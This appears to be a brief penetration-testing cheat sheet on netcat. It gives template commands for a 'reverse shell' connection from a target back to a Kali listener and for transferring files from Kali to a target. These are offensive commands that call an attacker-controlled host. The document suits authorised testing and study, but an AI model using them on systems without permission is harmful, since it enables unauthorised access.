## Netcat
*These commands assume that the `nc` or `nc.exe` binary is installed on both Kali and target machines*

### Netcat Reverse Shell
1. Listen on Kali machine: 
```bash
nc -nvlp $PORT
```

2. Connect from target machine: 
```bash
nc -nv $KALI_IP $PORT
```

### Netcat File Transfers
1. Listen for file on target machine:
```bash
nc -nvlp $PORT > $FILENAME
```

2. Send file from Kali machine:
```bash
nc -nv $TARGET_IP $PORT < /path/to/file
```
